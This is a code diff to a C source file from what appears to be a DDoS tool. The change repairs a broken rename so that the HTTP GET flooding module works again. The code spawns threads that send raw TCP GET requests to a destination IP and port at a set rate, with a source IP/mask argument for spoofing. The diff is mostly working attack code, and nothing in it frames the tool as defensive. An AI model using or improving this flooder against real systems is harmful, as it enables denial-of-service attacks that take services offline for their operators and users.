@@ -5,7 +5,9 @@
 #include "base/time_check.h"
 #include "ddos/get_flood.h"
 
-#define kGetFlooding_METHOD "kGetFlooding / HTTP/1.1\r\nHost: localhost\r\n\r\n"
+/// http request method message size in get flooding
+#define __GET_REQUEST_MSG_SIZE__ 100
+#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
 
 extern int g_num_threads;
 
@@ -25,12 +27,12 @@ pthread_cond_t g_get_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_get_before_time;
 struct timespec g_get_now_time;
 // request msg
-char g_get_request_msg[__kGetFlooding_REQUEST_MSG_SIZE__ ];
+char g_get_request_msg[__GET_REQUEST_MSG_SIZE__];
 
 void GetFloodPrintUsage(void)
 {
   printf(
-      "get flood Usage : "
+      "Get Flooding Usage : "
       "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
   return;
 }
@@ -60,15 +62,15 @@ void *GenerateGetFlood(void *data)
         &seq,
         &ack,
         0);
-    // send HTTP kGetFlooding method
+    // send HTTP GET method
     TcpSocketSendData(
         sock,
         inet_addr(g_get_now.src),
         inet_addr(g_get_now.dest),
         src_port,
         g_get_now.port,
-        kGetFlooding_METHOD,
-        strlen(kGetFlooding_METHOD),
+        GET_METHOD,
+        strlen(GET_METHOD),
         seq,
         ack,
         0);
@@ -104,7 +106,7 @@ void *GetFloodTimeCheck(void *data)
 
 void GetFloodMain(char *argv[])
 {
-  strcpy(g_get_request_msg, kGetFlooding_METHOD);
+  strcpy(g_get_request_msg, GET_METHOD);
   printf("Requesting: \n%s\n", g_get_request_msg);
   int argc = 0;
   while (argv[argc] != NULL) {
@@ -126,7 +128,7 @@ void GetFloodMain(char *argv[])
   for (int i = 0; i < num_threads; i++) {
     thread_ids[i] = i;
   }
-  printf("Sending kGetFlooding requests to %s using %d threads %u per sec\n",
+  printf("Sending GET requests to %s using %d threads %u per sec\n",
       g_get_input.dest, num_threads, g_get_request_per_sec);
   int i;
   for (i = 0; i < num_threads; i++) {
@@ -142,7 +144,7 @@ void GetFloodMain(char *argv[])
     printf("threads %d joined\n", i);
   }
   pthread_mutex_destroy(&g_get_mutex);
-  printf("kGetFlooding flood finished\nTotal %lu packets sent.\n",
+  printf("GET Flooding finished\nTotal %lu packets sent.\n",
     g_get_num_total);
   pthread_exit(NULL);
   return;
